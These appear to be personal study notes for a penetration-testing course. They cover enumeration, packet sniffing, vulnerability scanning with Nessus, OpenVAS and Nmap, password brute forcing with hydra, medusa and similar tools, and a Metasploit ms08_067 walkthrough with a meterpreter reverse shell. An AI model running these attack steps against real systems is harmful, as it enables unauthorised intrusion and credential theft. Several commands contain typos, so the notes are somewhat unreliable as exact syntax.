### Perform Unix/Linux User Enumeration

Enumeration is the first activity while performing a penetration test in Unix/Linux environments. Assume that port scan has been performed with Nmap and determine that finder daemon is running on port 79.

You can use following commands to enumerate Unix/Linux users.

- **Rusers**
  Use this command to view list of users who are logged onto remote machines or machines on local network.
  Syntax: /usr/bin/rusers [-a] [-l] [-u| -h| -i] [Host ...]
- **Rwho**
  Use this command to view list of users who are logged in to hosts on the local network.
  Syntax: rwho [-a]

* **Finger**
  Understanding the working of finger daemon and how can it be abused:

  - Finger daemon is a finger service which runs in the background and stores the
    logged in user information like username and full name.

  - Generally, finger daemon works on port 79.

  - You can abuse the finger daemon functionality by running finger client along with
    the remote users IP address.

  - Use finger@ [ipaddress] command to enumerate the list of logged in users.

  - After acquiring the list of users, you can use finger <username>@ [ipaddress]
    command to retrieve the logged in user details. Use this command to gain
    information about system users such as user’s login name, real name, terminal
    name, idle time, login time, office location, and office phone numbers.
    Syntax: **finger [-l] [-m] [-p] [-s] [user ...] [user@host ... ]**

    ![image-20210823131544436](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823131544436.png)

- enum4linux

  ```
  enum4linux [IP Address]
  ```

  

  ![image-20210823155011888](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823155011888.png)

### Perform IPv6 Enumeration

IPv6 is an advanced version of IPv4 where it can support more number of hosts compared to |Pv4. You can scan and enumerate possible IPv6 address of a machine in the network. Use tools such as Enyx and IPv6 Hackit to enumerate possible IPv6.

- **ENYX**

  Source: https://github.com

  ENYX SNMP IPv6 enumeration tool used for grabbing the possible IPv6 of a machine through the SNMP protocol.

  ![image-20210823155552854](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823155552854.png)

- Hackit

  Source: http://ipv6hackit.sourceforge.net

  Hackit is a scanning tool that provides you with a list of active IPv6 hosts. It can perform TCP port scanning and identify AAAA IPv6 host records.

  ![image-20210823155800473](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823155800473.png)

### Nmap Scripting Engine Categories

| Options   | Description                                      |
| --------- | ------------------------------------------------ |
| All       | Runs all available NSE scripts                   |
| Auth      | Run only the Auth Scripts                        |
| Default   | Execute the basic defaults scripts               |
| Discovery | Discover information in depth about a target     |
| External  | Scripts that contact external resources          |
| Intrusive | Scripts which considered intrusive by the target |
| Malware   | Checks for open Backdoors and Malware            |
| Safe      | Run scripts that are not intrusive               |
| Vuln      | Discovers common vulnerabilities                 |

#### Discovery

Run the script to discover informationabout the provided targets

- Querying public registries

- SNMP-enabled devices

- Directory services

  ````
  nmap --scripts discovery 10.101.10.10
  ````

  ![image-20210823161432592](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823161432592.png)

#### Nmap Server Message Block Scripts

```
[sherwinowen@parrot]─[/usr/share/nmap/scripts]
└──╼ $ls *smb*.nse
smb2-capabilities.nse           smb-enum-services.nse  smb-protocols.nse           smb-vuln-ms07-029.nse
smb2-security-mode.nse          smb-enum-sessions.nse  smb-psexec.nse              smb-vuln-ms08-067.nse
smb2-time.nse                   smb-enum-shares.nse    smb-security-mode.nse       smb-vuln-ms10-054.nse
smb2-vuln-uptime.nse            smb-enum-users.nse     smb-server-stats.nse        smb-vuln-ms10-061.nse
smb-brute.nse                   smb-flood.nse          smb-system-info.nse         smb-vuln-ms17-010.nse
smb-double-pulsar-backdoor.nse  smb-ls.nse             smb-vuln-conficker.nse      smb-vuln-regsvc-dos.nse
smb-enum-domains.nse            smb-mbenum.nse         smb-vuln-cve2009-3103.nse   smb-vuln-webexec.nse
smb-enum-groups.nse             smb-os-discovery.nse   smb-vuln-cve-2017-7494.nse  smb-webexec-exploit.nse
smb-enum-processes.nse          smb-print-text.nse     smb-vuln-ms06-025.nse
┌─[sherwinowen@parrot]─[/usr/share/nmap/scripts]
└──╼ $
```

#### Enumerate Shares

```
nmap --script smb-enum-shares.nse --script-args=unsafe=1 -p445 [IP Address]
```

![image-20210823173158053](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823173158053.png)

#### Enumerate Users

```
namp --script smb-enum-users.nse --script-args=unsafe-1 -p445 [IP Address]
```

### HTTP Enumeration Auxiliary Scripts in Metasploit

#### cert

- Enumerate whether the cert is active or expired

![image-20210823173711742](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823173711742.png)

#### dir_scanner

- Search for web server directories

- Similar to wfuzz and dirbuster

  ![image-20210823173914608](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823173914608.png)

#### files_dir

- search for the presence of files

  ![image-20210823174033589](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823174033589.png)

### Sniff the Network

Sniffing is a process of monitoring and capturing all data packets passing through a network. You can use sniffing tools such as Wireshark and Tcpdump to sniff the network. Sniffer turns the NIC of a system to the promiscuous mode to listen all the data transmitted on its segment. As a penetration tester, you should sniff the network and extract the following information:

- DNS traffic

- POP3/FTP/Telnet passwords

- Email traffic

- Router configuration

- Web traffic

- Telnet passwords

- Chat sessions

- Syslog traffic

#### Tcpdump: Capture Traffic using Tcpdump

- **Capturing and displaying captured packets in both HEX and ASCII format with tcpdump -XX**

  ```
  tcpdump -xx -c 20 -s 0 -i eth0
  ```

  [](images/image-20210823174945170.png)

  ![image-20210823180057229](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823180057229.png)

  ![image-20210823180146939](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823180146939.png)

- **Filter traffic by protocol**

  ```
  tcpdump -c5 -s 0 -i eth0
  ```

  ![image-20210823180303179](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823180303179.png)

  

- **Writing packet captured in file and reading it**

  ```
  tcpdumd -w packetcapture.pcap -c 5 -s 0 -i eth0
  ```

  ![image-20210823175430851](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823175430851.png)

  ```
  tcpdump -tttt -r packetcapture.pcap
  ```

  ![image-20210823175532728](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823175532728.png)

- Filter traffic by header

  Filtering and displaying only SYN packets. It displays TCP headers that contain a TCP flag byte equal to 2 flag (Syn flag set)

  ```
  tcpdump -c 5 -s 0 -i eth0 'tcp[13]==2'
  ```

  ![image-20210823175921160](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210823175921160.png)



### Some of the additional commands of tcpdump are mentioned below:

- To capture packets from specific interface

```
tcpdump -i etho
```

- To capture N number of packets

```
tcpdump -c 5 -i ethO
```

- To display captured packets in ASCII

```
tcepdump -A -i ethO
```

* To display packets in HEX and ASCII

```
tcpdump -XX -i ethO
```

-  To capture and save packets in a file

```
tcpdump -w 0001.pcap -i eth0
```

-  To read captured packets file

```
tcpdump -r 0001.pcap
```

- To capture TCP packets

```
tcpdump -i ethO tcp
```

- To capture packet from specific port

```
tcpdump -i ethO port 22
```

- To capture packets from source IP

```
tcpdump -i ethO src 192.168.0.2
```

-  To capture packets from destination IP

```
tcpdump -i ethO dst 50.116.66.139
```



## Vulnerability Assesment

Vulnerability assessment is a process of identifying vulnerabilities or loopholes in any organizational network infrastructure. Vulnerability assessment is a part of penetration testing where a penetration tester performs vulnerability assessment to identify the loopholes of the target network and find out the entry points to perform exploitation. Based on that information, now we will find known vulnerabilities both online and offline.

Source: http://www.pentest-standard.org

“Before performing a penetration test it is beneficial to determine the maturity level of the client’s security posture. It is often a good idea to perform a vulnerability analysis first before penetration testing.”

### Perform Internal Vulnerability Assessment

Internal vulnerability assessment is performed to assess the network and system controls of internal security posture. Systems or devices within internal network are evaluated for vulnerabilities like Trojans, malware, misconfiguration, and so on. Organizations invest more in protecting their network externally, but they also should secure their internal network from fraud employees and temporary contractors.

Internal vulnerability assessment can have from any of two potential attacker groups:

- Unprivileged guests: This group has no privileges other than some general information like standard LAN jack. These are the members who try to gain access through firewall but not yet gained any network privileges. 

- Trusted internal users: They have all the privileges and access to standard information of the network.

Once you find out what ports respond as being open by port scanning a network or individual machines, you can begin to determine vulnerabilities present on the services used by these ports. The goal of running a vulnerability scanner is to identify network devices open to known vulnerabilities.

### Vulnerability Scanning Objectives

- Identify the attack surface
- Determine the risk
- Assess the severity of the findings
- Draft a report of the findings
- Develop a remediation plan

### Network Vulnerability Scanning

- Look at the data at the network level
- Assess the services accessible to the scanner
- The DMZ and other accessible zones are investigated
- Review the protocol and traffic of the subnet... routing
- Determines the attack surface atthe network layer and transport layer
  - TCP
  - UDP

### Host Vulnerability Scanner

- Review the attack surface on the host machine
- Assessment of the applications that are installed
- An investigation of the processes running on the machine
- Works best with credentials

### Scanner Configuration

- Usually involves setting scan parameters
- Set the network protocols and ports to test
- Identify the method of host discovery
- Create a policy
- Most scanners have templates that assist

### Scan Templates

**Nessus**

- Contains a large number of templates for different scanning situations
- Dependent on the license that you are registered with:
  - Home
    - Limited templates

### Scanner Configuration OpenVAS

- Free and open source

- Fork of the original Nessus project

- Maintained by the CTO of Tenable

  - Original creator of Nessus

- Is powerful, but takes more time than Nessus to complete a scan

### Nessus

#### Nessus Scanners Listing

- Allows for control over different scanners

![image-20210824174022765](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824174022765.png)

#### Plugins

- Every audit is coded as a plugin within Nessus

- More than 80,000 plugins in Nessus

- Updating the plugins is critical

  - Online

    - Checks for updates every 24 hours if connected to the Internet

  - Offline

    - Requires challenge and response codes
      - Needs the key that is provided from tenable

    ![image-20210824173756939](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824173756939.png)

#### Plugin Familes

Different plugins based on requirements

1. Operating system
2. Application, etc.

![image-20210824174607660](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824174607660.png)

#### Sub-plugins

- Each plugin can have sub-plugins
- More granular information about the check

![image-20210824174809707](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824174809707.png)

#### Built-in Policies

- Nessus provides a variety of scan templates
- Most common
  - Basic network scan
    - Provides a comprehensive scan for most networks
    - Does not scan all 65536 ports
      - Have to change the settings for that

![image-20210824175155614](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824175155614.png)

#### Available Plugins

- Each plugin represents an audit check

- Access the plugins

  - New Scan | Advance Scans | Plugins

    ![image-20210824174607660](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824174607660.png)

#### Custom Scan

When you elect to do a custom scan, you have control over what plugins loaded, and you can manually select the ones you need

- Makes fora more granular approach to the testing
- Can take time to configure
- You need to have knowledge of what you are looking for to get the best results

#### Tailoring Scans

![image-20210824180018992](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824180018992.png)

##### Discovery

- Can select ports
- Speed
- Port scanner settings
- Protocols for pinging potential targets:
  - Useful when firewall is on
  - ICMP blocked by default

![image-20210824180702432](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824180702432.png)

##### Assessment

- Can set more specific scan parameters

![image-20210824180852402](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824180852402.png)



##### Report

- Two components
  - Processing
  - Output

![image-20210824181117958](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824181117958.png)

##### Advanced

- Configure performance parameters

- Low bandwith links

![image-20210824181601506](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824181601506.png)  

### OpenVAS 

- Similar to Nessus
- Contains plugins
- Same as Nessus concepts

### Perform Network Vulnerability Scanning using Network Vulnerability Scanners

- **QualysGuard**
  Source: https://www.qualys.com
  Qualysguard helps in protecting the IT infrastructure in accordance with the company’s policies and procedures. It identifies the internal threats and develops methods required to protect the network. Features of the Qualysguard network vulnerability tool are as follows:
  - It identifies the operating system, open ports, and active services running on a system
  - Examines the network continuously for any changes
  - Provides an approach to prioritize the remediation steps
  - Assists with scanning the internal network for vulnerabilities
  - Provides reports to the user to understand the security of the network

![image-20210824182310595](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824182310595.png)

- **Nessus**
  Source: https://www.tenable.com
  A vulnerability scanner that scans the following types of vulnerabilities:
  - Hackers getting access to important data in the system
  - Misconfiguration
  - Password attack
  - Denial of service against the TCP/IP stack
  - Preparation of PCI-DSS audits

- **GFI LanGuard**
  Source: https://www.gfi.com
  GFI LanGuard scans your operating systems, virtual environments, and installed applications through vulnerability check databases such as OVAL and SANS Top 20. GFI LanGuard enables you to analyze the state of your network security, identify risks, and address how to act before it is compromised.

![image-20210824182609811](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824182609811.png)

![image-20210824182711186](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824182711186.png)

- **OpenVas**
  Source: http://www.openvas.org
  OpenVAS provides a comprehensive and powerful vulnerability scanning and management solution. OpenVAS receives support and contributions from many individuals and organizations (penetration testers, power users, security researchers, academia, and so on), adding to the quality and reliability of the solution.

- **Nmap**

  Perform Vulnerability Scanning using Nmap
  You can also perform vulnerability assessment using Nmap. You can use in-built NSE script available at /usr/share/nmap/scripts for scanning specific vulnerability.

![image-20210824183048177](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824183048177.png)

Scripts can be run from an authorized third party unless you trust the author, because scripts cannot be run in a sandbox which can lead to accidental or malicious damage to your system or even evade the system privacy.

```
--script <filename>|<category>|<directory>|<expression>[,...]
```

The above syntax runs a script scan which contains the list of filenames, category, directory, and expressions separated with comma. Each element in the syntax is first taken as an expression, then category, and finally file or directory name. 

Consider the below syntax used to check if an FTP server allows anonymous login.

```
nmap -script ftp-anon -p 21 <target ip address>
```

ftp-anon is used to check if an FTP server allows anonymous login.

![image-20210824183307396](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824183307396.png)

### Vulnerability Assessment Reports 

**Security Vulnerability Report**

This report gives information about:

- New vulnerabilities
- Open ports and detected services
- Suggestions for remediation
- Links to patches

**Security Vulnerability Summary**
This report is produced for every server after scanning and provides details of:

- Current security flaws
- Resolved prior detected vulnerabilities


Vulnerability assessment report describes the entire process of performed assessment and also discusses the identified vulnerabilities during the process. The vulnerability assessment report consists of security vulnerability report and security vulnerability summary. Security vulnerability report gives the information about new vulnerabilities, open ports and detected services, suggestions for remediation, links to patches, and so on. Security vulnerability summary provides the information about current security flaws, resolved prior detected vulnerabilities, and so on.

Following are some of the guidelines to write a good vulnerability assessment report:

- **Title of the vulnerability**: This plays an important role in the first impression of the reader.
- **Description**: Readers does not like to spend more time in reading; it is better to keep it short, clear, and specific. Usage of references or links will help in better understanding.
- **Proof of concept**: It is always better to treat reader as a new to this thing. Provide a step-by-step procedure to perform for vulnerability.
- **Tools**: Mention the tools helpful in finding the vulnerability. 
- **Solution**: Provide a clear solution for the problem. Do not keep it too brief and explain them all the possible solutions to fix the vulnerability.

### Map the Service Version with the Associated Security Vulnerabilities

Vulnerability analysis can be performed manually by searching online in the Exploit Database or can use automated vulnerability scanners like Open-Vas and Nessus. But scanning with automated tools is tough because it takes a lot of time, requests, and traffic to complete the scan; sometimes the excessive traffic might lead to DOS crash, so it is advised to take the prior permission when performing such kind of scans on hosts. One more point to keep in mind while using automated tools is to use multiple tools to rule out false positives. So, it is better to opt manual search for vulnerabilities instead of totally relining on automated scanners. 

Manually, you can type the product or service name on the Google to identify the known vulnerabilities of that service as shown in the figure. Another way to search for vulnerabilities is to directly go to the CVE details website and search for any specific software product for known vulnerabilities, for example, IIS 7.5. The details of bugs can be displayed as shown in the below screenshot.

![image-20210824184355275](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824184355275.png)

![image-20210824184426391](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210824184426391.png)

### Scan Analysis Process

- Take the result and review them

- Identify the points of weakness

  - Hosts

  - Protocol

  - Application, etc.

    ![image-20210825062833381](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825062833381.png)

- Investigate the listing of vulnerabilities

![image-20210825062933122](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825062933122.png)

- Interogate the vulnerability information

![image-20210825063038660](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825063038660.png)

- Evaluate the recommended solution

![image-20210825063135531](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825063135531.png)

- See if Nessus has provided an output

- Can use this in report as well

![image-20210825063255884](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825063255884.png)

![image-20210825063459503](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825063459503.png)

- Review the risk information and additional details
  - CVSS (Common Vulnerability Scoring System)
  - Vulnerability information
  - Exploitable with
  - References

![image-20210825064000891](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825064000891.png)

- Examine at least one reference

  - CVE (Common Vulnerability Exposure)

    ![image-20210825064454525](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825064454525.png)

  - BID (BugtraqID)

    ![image-20210825064536485](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825064536485.png)

- Review the information and compare to your scanner data

### Scan Analysis at the Network Level

- Before youscan a production network

  - Scan a test machine

- Evaluate the scanning activity at the network level

  - Use a protocol analyzer

- Tools

  - Tcpdump

    - Command line

  - Wireshark
    - Gui 
    - Advanced protocol dissection

### Nessus Scan Results

1. Hosts
2. Vulnerabilities
3. Remediation
4. History

![image-20210825065247985](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825065247985.png)

### Attack Scripting

- Nessus and OpenVAS have scripting capability
- Format is in the Nessus Attack Scripting Language
  - NASL is generally similar to C and Perl, so if you can work in either of those a little, you should be fine

**NASL Banner Grab**

```
socket = open_sock_tcp(23);
if (! socket) exit(0);
mesg = raw_string(0x0d);
send(socket:socket, data:mesg) ;
banner = recv_line(socket:socket, length:4096);
banner += recv_line(socket:socket, length: 4096) ; display (banner) ;
```

### Nmap Vulnerability Scanner

- The scripting engine contains multiple scripts for scanning for vulnerabilities

  ```
  ls *vuln*.nse
  ```

  ```
  ┌─[sherwinowen@parrot]─[/usr/share/nmap/scripts]
  └──╼ $ls *vuln*.nse
  afp-path-vuln.nse           http-vuln-cve2014-2128.nse       smb2-vuln-uptime.nse
  ftp-vuln-cve2010-4221.nse   http-vuln-cve2014-2129.nse       smb-vuln-conficker.nse
  http-huawei-hg5xx-vuln.nse  http-vuln-cve2014-3704.nse       smb-vuln-cve2009-3103.nse
  http-iis-webdav-vuln.nse    http-vuln-cve2014-8877.nse       smb-vuln-cve-2017-7494.nse
  http-vmware-path-vuln.nse   http-vuln-cve2015-1427.nse       smb-vuln-ms06-025.nse
  http-vuln-cve2006-3392.nse  http-vuln-cve2015-1635.nse       smb-vuln-ms07-029.nse
  http-vuln-cve2009-3960.nse  http-vuln-cve2017-1001000.nse    smb-vuln-ms08-067.nse
  http-vuln-cve2010-0738.nse  http-vuln-cve2017-5638.nse       smb-vuln-ms10-054.nse
  http-vuln-cve2010-2861.nse  http-vuln-cve2017-5689.nse       smb-vuln-ms10-061.nse
  http-vuln-cve2011-3192.nse  http-vuln-cve2017-8917.nse       smb-vuln-ms17-010.nse
  http-vuln-cve2011-3368.nse  http-vuln-misfortune-cookie.nse  smb-vuln-regsvc-dos.nse
  http-vuln-cve2012-1823.nse  http-vuln-wnr1000-creds.nse      smb-vuln-webexec.nse
  http-vuln-cve2013-0156.nse  mysql-vuln-cve2012-2122.nse      smtp-vuln-cve2010-4344.nse
  http-vuln-cve2013-6786.nse  rdp-vuln-ms12-020.nse            smtp-vuln-cve2011-1720.nse
  http-vuln-cve2013-7091.nse  rmi-vuln-classloader.nse         smtp-vuln-cve2011-1764.nse
  http-vuln-cve2014-2126.nse  rsa-vuln-roca.nse                vulners.nse
  http-vuln-cve2014-2127.nse  samba-vuln-cve-2012-1182.nse
  ```

- The easiest and simplest method is to just run all scripts

- This is not the most efficient, but it is worth attempting, especially in CTF scenarios 

  ```
  nmap -sV --version-all -p- --script vuln 192.168.177.114
  ```

  - This scan will scan all ports and run all vulnerability scripts
    - Very time consuming!

#### Windows Vulnerability Script Results

```
nmap -sV --version-all -p- --script vuln 10.10.10.10
```

![image-20210825070816013](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825070816013.png)

#### Linux Vulnerability Script Results

```
nmap -sV --version-all -p- --script vuln 10.10.10.9
```

![image-20210825071026859](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825071026859.png)

#### SMB Vulnerability Scanning

```
nmap -p 445 --script=smb-vuln-ms17-010.nse [IP Address]
```

#### Heartbleed Vulnerability Scanning

```
nmap -p 443 --script ssl-heartbleed -sV [IP Address]
```

### Custom Vulnerability Script

- The correct way to report vulnerabilities in NSE is through the library vulns. Let's review the process of reporting a vulnerability

  ```
  local vuln = { title = "<TITLE GOES HERE>",
    			   state = vulns.STATE.NOT_VULN,
    			   references = {"<URL1>", "URL2"},
  			   description = [[<DESCRIPTION GOES HERE> ]],
  		 	   IDS = {CVE = "<CVE ID>", BID = "BID ID"},
  			   risk_factor = "High/Medium/Low" }
  ```

### Vulnerability States

```
STATE_MSG = {
  [STATE.LIKELY_VULN] = 'LIKELY VULNERABLE',
  [STATE.NOT_VULN] = 'NOT VULNERABLE',
  [STATE.VULN] = 'VULNERABLE',
  [STATE.DoS] = 'VULNERABLE (DoS)',
  [STATE.EXPLOIT] = "VULNERABLE (Exploitable) ',
  [bit.bor (STATE.DoS, STATE.VULN)] = 'VUNERABLE (DoS)',
  [bit.bor (STATE.EXPLOIT, STATE.VULN)] = 'VULNERABLE (Exploitable)',
}
```



### Windows Exploitation

After identifying the vulnerabilities related to the target operating system, if you find the installed OS on the victim machine is Windows, then you need to attempt various techniques to exploit the Windows operating system to gain the root access or escalate privileges.

#### Reality 

- We have to have vulnerabilities
- Without them there is no hack!
- The good news is that all systems have some sort of flaws
- There are many exploit references, and to get deep into it requires some form of code understanding
  - This takes time
  - Not all want to get that deep into it
  - Use frameworks etc.

#### Operating Systems

- There will still be flaws and bugs in any OS
- Fewer of them as time passes
- Windows Server 2019 is pretty tight
- The processes we have covered are used to find the weaknesses to attack  

#### Exploitation

- Validation of vulnerabilities
- Compromise the victim

  - Use vulnerabilities that were discovered during the methodology

    - Not all vulnerabilities will be exploitable
- Deliver the payload
  - Once the victimis compromised, what should happen?
    -  Leave a record proving access
    -  Grab files, plant a keystroke logger, crack passwords etc.
- From this point of access
  - Footprintand enumerate other systems
  - Remember the rules of engagement

#### Exploiting Targets

- Exploits are highly specific
- Have to know the build and revision number
  - Windows
    - Service pack
  - Linux
    - Kernel data
- In Metasploit view with show targets
  ![image-20210825073536989](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825073536989.png)

#### Data Collection

**Collect enough data to:**

- Discover potential vulnerabilities

  - Banners of the services (SMTP, SSH, HTTP/HTTPS, FTP, POP3)

  - OS identification

- Choose the appropriate exploit to match the target
  - Not an exact science

- Narrow the field of attack vectors 
  - Highest privilege result is preferred

#### Finding Exploits

- We need to find exploits

- Most vulnerability lists do not post exploits
  - Except for bugtraq

- Can use http://seclists.org
  - A complete listing of security sites and feeds

- Ideal exploits are proof of concept (POC)
- Once you get the exploit:
  - Have to review it
    - Could be a trojan horse or other form of malware
    - Rarely documented
    - Require compilers or interpreters
    - May not work

  - Thoroughly test it in a lab before deployment

#### Exploit Publishers

**Exploit db**

- www.exploit-db.com

- Commonly have zero-day exploits

  ![image-20210825091236626](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825091236626.png)

**Packetstorm** 

- www.packetstormsecurity.com

  ![image-20210825091432440](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825091432440.png)

### Exploit DB in Parrot

- We can use searchsploit to look for exploits

  ```
  ┌─[root@parrot]─[/home/sherwinowen]
  └──╼ #searchsploit shellshock remote
  ------------------------------------------------------------------------------------ ---------------------------------
   Exploit Title                                                                      |  Path
  ------------------------------------------------------------------------------------ ---------------------------------
  Advantech Switch - 'Shellshock' Bash Environment Variable Command Injection (Metasp | cgi/remote/38849.rb
  Apache mod_cgi - 'Shellshock' Remote Command Injection                              | linux/remote/34900.py
  Bash - 'Shellshock' Environment Variables Command Injection                         | linux/remote/34766.php
  Bash CGI - 'Shellshock' Remote Command Injection (Metasploit)                       | cgi/webapps/34895.rb
  Cisco UCS Manager 2.1(1b) - Remote Command Injection (Shellshock)                   | hardware/remote/39568.py
  dhclient 4.1 - Bash Environment Variable Command Injection (Shellshock)             | linux/remote/36933.py
  GNU Bash - 'Shellshock' Environment Variable Command Injection                      | linux/remote/34765.txt
  IPFire - 'Shellshock' Bash Environment Variable Command Injection (Metasploit)      | cgi/remote/39918.rb
  NUUO NVRmini 2 3.0.8 - Remote Command Injection (Shellshock)                        | cgi/webapps/40213.txt
  OpenVPN 2.2.29 - 'Shellshock' Remote Command Injection                              | linux/remote/34879.txt
  Postfix SMTP 4.2.x < 4.2.48 - 'Shellshock' Remote Command Injection                 | linux/remote/34896.py
  SonicWall SSL-VPN 8.0.0.0 - 'shellshock/visualdoor' Remote Code Execution (Unauthen | hardware/webapps/49499.py
  TrendMicro InterScan Web Security Virtual Appliance - 'Shellshock' Remote Command I | hardware/remote/40619.py
  ------------------------------------------------------------------------------------ ---------------------------------
  Shellcodes: No Results
  ```

### Exploits

**If it is a compiled language:**

- Look for the readme file
- Is there a configure file?
  - ./configure
  - make
  - make install
  - make clean
- Compile the rest
  - gcc or g++

- Scripting language

  - Load the code in an interpreter and test it

- Always test in a lab or sandboxed environment
- Analyze it at the packet level

### Full Disclosure

- We need to frequent the lists that are full disclosure
  - https://seclists.org/fulldisclosure/

![image-20210825172643058](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825172643058.png)

### Questions to Ask about the Exploit

- Location of the attacker

  - Remote is preferred

  - Local can be used for internal testing or when we gain access via a remote vector

- Are exploits available
  -  Is it in a framework or have to build the code
- Impact of the exploit
  - Denial of service are not much use
- Complexity of the exploit

### Location

- **Remote**
  Network is reachable: As mentioned is ideal

- **Local**

  Physical: At the host machine

- **Subnet**
  Present on the same subnet (man in the middle)

- **Intranet**
  Inside the internet firewall

### Complexity

- **Coding skills**
  - C
  - Java
  - Php
  - Others
- **State**
- **Decryption or decoding required**

### What about Authentication

- Is it required?
- Data analysis should reveal potential password attack vectors
  - Ssh
  - Smb
  - rdp
- Most web apps need authentication

### You do not Always have to run an Exploit to own the box!

- Have you ever configured a router and made a mistake?
- We can always get access because of admin errors etc.
- Services can be brute forced!

### Remote Password Attack

**1. Hydra is the tool of choice**

- Can attack most of the desired services

  ```
  hydra -e nsr -L sqlmap.txt 192.168.177.200 ssh -t 4
  hydra -l jason -P /usr/share/wordlists/rockyou.txt <IP> <protocol>
  ```

**2. Patator**

  ```
patator ssh_login host=192.168.177.200 user=root password=FILE0 0=/usr/share/wordlists/rockyou.txt
  ```

![image-20210825175107215](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825175107215.png)

**3. Ncrack**

```
ncrack -v --user sys -P /usr/share/wordlists/rockyou.txt ssh://<IP>
```

![image-20210825175221641](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825175221641.png)

**4. Medusa**

```
medusa -h 192.168.177.200 -u root -P rockyou.txt -M ssh
```

- U = use a file

![image-20210825175543108](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825175543108.png)

**rdesktop**

```
rdesktop -u administrator -p Pa$$w0rd123 192.168.177.147
```

![image-20210825175733644](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825175733644.png)

### Wpscan for Exploitation 

- Brute force passwords

  ```
  wpscan --url [wordpress url] username [username to brute force] --password [path to wordlist] --threads [number of threads to use]
  ```

  ![image-20210825175939071](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825175939071.png)

  

### Exploit Frameworks

1. **Metasploit**

- Open source
- Extensive library of exploits

**2. Canvas**

- Commercial
- Linux based

**3. Core Impact**

- Commercial
- High-end => expensive

### Identify Local/Remote Exploit to Gain Access to Windows System

 ![image-20210825180529751](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825180529751.png)

### Try to Gain Access to Windows using Remote Shell

Windows store its encrypted passwords inside a file called SAM file. Passwords in this file are stored in hashed format. The file is located in c:\windows\system32\config\sam directory. If you can gain access to the administrative system, then the copy of the encrypted passwords can be grabbed.

A trusted framework hacking tool, Metasploit, will be helpful in grabbing this SAM file. Metasploit is a framework for cyber exploitation. It makes our effort easy in exploiting the known vulnerabilities. Meterpreter that was developed by Metasploit makes maintaining access and controlling easier when installed into a target system. 

Following are the steps to be followed to gain access to remote Windows system through
identified exploits:

- Search in metasploit for netapi

  Syntax: msf > search netapi

- Then, you can use any one of the results you got in the search.
  Syntax: msf > use exploit/windows/smb/ms08_067_netapi

![image-20210825180841421](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825180841421.png)

- Then, you can set the payload to the Meterpreter by using the following command:
  Syntax: msf exploit (ms08_067_netapi) > set payload /windows/meterpreter/reverse_tcp

![image-20210825181056855](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825181056855.png)

- Then, you check the payload options by using the following command:
  Syntax: msf exploit (ms08_067_netapi) > show options

![image-20210825181208612](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825181208612.png)

- Then, set both LHOST (the IP address of our computer) and RHOST (the IP address of the victim computer)
  Syntax:

  ```
  msf exploit (ms08_067_netapi) > set lhosts <the IP address of our computer>
  msf exploit (ms08_067_netapi) > set rhosts <the IP address of the victim computer>
  ```

![image-20210825181409277](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210825181409277.png)

- Now after performing all the previous steps, you can run the exploit command to perform the exploitation:
  Syntax: msf exploit (ms08_067_netapi) > exploit
